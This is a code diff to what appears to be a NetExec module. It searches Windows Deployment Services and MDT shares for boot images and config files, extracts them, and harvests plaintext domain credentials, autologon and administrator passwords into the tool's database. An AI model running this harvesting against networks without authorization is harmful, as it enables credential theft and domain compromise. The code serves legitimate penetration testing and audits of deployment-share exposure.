@@ -1,12 +1,16 @@
+import shutil
+import subprocess
+import tempfile
 from base64 import b64decode
 from configparser import ConfigParser, Error as ConfigError
 from io import BytesIO
 from pathlib import Path, PureWindowsPath
 from xml.etree import ElementTree as ET
 
+from dissect.archive.wim import WIM
 from nxc.helpers.misc import CATEGORY, decode_text
 from nxc.helpers.path import sanitize_path_component
-from nxc.paths import NXC_PATH
+from nxc.paths import NXC_PATH, TMP_PATH
 
 
 class NXCModule:
@@ -87,9 +91,13 @@ class NXCModule:
             self.context.log.fail(f"Failed to save {share}\\{path}: {e}")
             return False
 
+    WIM_CRED_PATHS = {
+        ("Deploy", "Scripts", "Bootstrap.ini"),
+        ("Deploy", "Scripts", "CustomSettings.ini"),
+    }
+
     def explore_wds(self, share):
-        self.context.log.success(f"Found share: {share}")
-        downloaded = False
+        self.context.log.success(f"Found share: {share} (readable by any authenticated domain user)")
         for path in (r"Boot\x64\Images", r"Boot\x86\Images"):
             try:
                 entries = self.connection.conn.listPath(share, f"{path}\\*")
@@ -100,43 +108,70 @@ class NXCModule:
             for entry in entries:
                 if entry.is_directory() or not entry.get_longname().lower().endswith(".wim"):
                     continue
-                self.context.log.success(f"Found WIM image: {share}\\{path}\\{entry.get_longname()} ({entry.get_filesize() / (1024 * 1024):.0f} MB)")
+                full_path = f"{path}\\{entry.get_longname()}"
+                size_mb = entry.get_filesize() / (1024 * 1024)
                 if not self.ignore_size_limit and entry.get_filesize() >= self.WIM_MAX_SIZE:
-                    self.context.log.display(f"Skipping {path}\\{entry.get_longname()} (1 GiB WIM download limit; use IGNORE_SIZE_LIMIT=TRUE to download)")
+                    self.context.log.success(f"Found WIM image: {share}\\{full_path} ({size_mb:.0f} MB)")
+                    self.context.log.display(f"Skipping {full_path} (1 GiB WIM download limit; use IGNORE_SIZE_LIMIT=TRUE to download)")
                     continue
-                if self.save_file(share, f"{path}\\{entry.get_longname()}"):
-                    downloaded = True
-
-        if downloaded:
-            self.context.log.display("Manually extract candidate WinPE images with 7zip or wimlib-imagex to look for credentials.")
-            self.context.log.display(r"Check Deploy\Scripts\Bootstrap.ini and Deploy\Scripts\CustomSettings.ini.")
+                self.context.log.success(f"Found WIM image: {share}\\{full_path} ({size_mb:.0f} MB) (downloading...)")
+                buf = BytesIO()
+                try:
+                    self.connection.conn.getFile(share, full_path, buf.write)
+                except Exception as e:
+                    self.context.log.fail(f"Failed to download {share}\\{full_path}: {e}")
+                    continue
+                self.save_file(share, full_path, buf.getvalue())
+                buf.seek(0)
+                self.parse_wim(buf, f"{share}\\{full_path}")
 
     def explore_mdt(self, share):
-        self.context.log.success(f"Found share: {share}")
+        self.context.log.success(f"Found share: {share} (admin access or misconfigured ACLs)")
         paths = [r"Control\Bootstrap.ini", r"Control\CustomSettings.ini"]
         try:
             paths.extend(self.connection.spider(share, folder="Control", pattern=["Unattend.xml"]))
         except Exception as e:
-            self.context.log.fail(f"Failed to explore {share}\\Control: {e}")
+            if "STATUS_ACCESS_DENIED" not in str(e):
+                self.context.log.fail(f"Failed to explore {share}\\Control: {e}")
 
-        for path in dict.fromkeys(str(PureWindowsPath(path)) for path in paths):
+        for path in dict.fromkeys(str(PureWindowsPath(p)) for p in paths):
             content = BytesIO()
             try:
                 self.connection.conn.getFile(share, path, content.write)
             except Exception as e:
-                self.context.log.fail(f"Failed to read {share}\\{path}: {e}")
+                if "STATUS_ACCESS_DENIED" in str(e):
+                    self.context.log.display(f"Access denied on {share}\\{path} (expected for hardened MDT share)")
+                else:
+                    self.context.log.fail(f"Failed to read {share}\\{path}: {e}")
                 continue
             content = content.getvalue()
-            self.save_file(share, path, content)
 
             try:
-                self.report_findings(self.parse_ini(content, f"{share}\\{path}") if path.lower().endswith(".ini") else self.parse_xml(content, f"{share}\\{path}"))
+                parser = self.parse_ini if path.lower().endswith(".ini") else self.parse_xml
+                all_fields = {}
+                all_credentials = []
+                for _, fields, credentials in parser(content, path):
+                    all_fields.update(fields)
+                    all_credentials.extend(credentials)
+                if all_fields:
+                    self.context.log.success(f"Credentials found in {path}")
+                    for key, value in all_fields.items():
+                        self.context.log.highlight(f"  {key}={value if value is not None else '<no value>'}")
+                    for domain, username, password in all_credentials:
+                        if not domain and "\\" in username:
+                            domain, username = username.split("\\", 1)
+                        try:
+                            self.context.db.add_credential("plaintext", domain, username, password)
+                        except Exception as e:
+                            self.context.log.fail(f"Failed to store credential from {path}: {e}")
             except (ConfigError, ET.ParseError, ValueError, LookupError) as e:
                 self.context.log.fail(f"Failed to parse {share}\\{path}: {e}")
 
+            self.save_file(share, path, content)
+
     def report_findings(self, findings):
         for source, fields, credentials in findings:
-            self.context.log.success(f"Found deployment settings in {source}")
+            self.context.log.success(f"Credentials found in {source}")
             for key, value in fields.items():
                 self.context.log.highlight(f"  {key}={value if value is not None else '<no value>'}")
 
@@ -165,6 +200,14 @@ class NXCModule:
             if fields:
                 yield source, fields, credentials
 
+    xml_block_prefix = {
+        "credentials": "Credentials",
+        "autologon": "AutoLogon",
+        "localaccount": "LocalAccount",
+        "administratorpassword": "AdministratorPassword",
+        "offlineadministratorpassword": "OfflineAdministratorPassword",
+    }
+
     def parse_xml(self, content, source):
         content = ET.fromstring(content)
         for element in content.iter():
@@ -176,6 +219,7 @@ class NXCModule:
                 yield source, {"MachinePassword": element.text or ""}, []
             if element.tag not in self.xml_accounts:
                 continue
+            prefix = self.xml_block_prefix[element.tag]
             fields = {child.tag: child.text or "" for child in element if child.tag in {"username", "name", "domain"}}
             credentials = []
             if element.tag == "credentials":
@@ -195,7 +239,81 @@ class NXCModule:
             if password is not None and (not self.xml_accounts[element.tag] or fields.get(self.xml_accounts[element.tag])):
                 credentials.append((fields.get("domain", ""), fields[self.xml_accounts[element.tag]] if self.xml_accounts[element.tag] else "Administrator", password))
             if fields:
-                yield source, fields, credentials
+                if self.xml_accounts[element.tag]:
+                    display = {f"{prefix}.{k.title()}": v for k, v in fields.items()}
+                else:
+                    display = {prefix: fields.get("password", "")}
+                yield source, display, credentials
+
+    def parse_wim(self, fh, source):
+        """Extract credentials from a WIM image using dissect, falling back to 7z for unsupported compression."""
+        try:
+            wim = WIM(fh)
+            found = False
+            for image in wim.images():
+                if self.walk_wim_dir(image.root, (), source):
+                    found = True
+            if not found:
+                self.context.log.display(f"No credential files found inside {source}")
+        except NotImplementedError:
+            self.parse_wim_7z(fh, source)
+
+    def walk_wim_dir(self, directory, path_parts, source):
+        if directory.entry.SubdirOffset == 0:
+            return False
+        found = False
+        for entry in directory.iterdir():
+            current = (*path_parts, entry.name)
+            if entry.is_reparse_point():
+                continue
+            if entry.is_dir():
+                if self.walk_wim_dir(entry, current, source):
+                    found = True
+            elif current in self.WIM_CRED_PATHS:
+                with entry.open() as src:
+                    content = src.read()
+                wim_file_path = "\\".join(current)
+                try:
+                    findings = list(self.parse_ini(content, f"{source} -> {wim_file_path}"))
+                    if findings:
+                        found = True
+                        self.report_findings(findings)
+                except (ConfigError, ValueError, LookupError) as e:
+                    self.context.log.fail(f"Failed to parse {source} -> {wim_file_path}: {e}")
+        return found
+
+    def parse_wim_7z(self, fh, source):
+        """Fallback: extract credential files from a WIM using 7z when dissect lacks the compression codec."""
+        if not shutil.which("7z"):
+            self.context.log.display(f"Cannot extract {source} (unsupported compression and 7z not installed)")
+            self.context.log.display(r"Install p7zip or extract manually: Deploy\Scripts\Bootstrap.ini and Deploy\Scripts\CustomSettings.ini")
+            return
+        tmp_dir = tempfile.mkdtemp(dir=TMP_PATH)
+        tmp_wim = str(Path(tmp_dir, "image.wim"))
+        try:
+            fh.seek(0)
+            with open(tmp_wim, "wb") as f:
+                shutil.copyfileobj(fh, f)
+            targets = ["Deploy/Scripts/Bootstrap.ini", "Deploy/Scripts/CustomSettings.ini"]
+            subprocess.run(["7z", "e", tmp_wim, f"-o{tmp_dir}", *targets, "-r", "-aoa"], capture_output=True, timeout=120)
+            found = False
+            for name in ("Bootstrap.ini", "CustomSettings.ini"):
+                extracted = Path(tmp_dir, name)
+                if extracted.is_file():
+                    content = extracted.read_bytes()
+                    try:
+                        findings = list(self.parse_ini(content, f"{source} -> Deploy\\Scripts\\{name}"))
+                        if findings:
+                            found = True
+                            self.report_findings(findings)
+                    except (ConfigError, ValueError, LookupError) as e:
+                        self.context.log.fail(f"Failed to parse {source} -> Deploy\\Scripts\\{name}: {e}")
+            if not found:
+                self.context.log.display(f"No credential files found inside {source}")
+        except Exception as e:
+            self.context.log.fail(f"7z extraction failed for {source}: {e}")
+        finally:
+            shutil.rmtree(tmp_dir, ignore_errors=True)
 
     def xml_password(self, element, source, suffix):
         # Encoding inferred from Microsoft's examples; PlainText defaults to true.
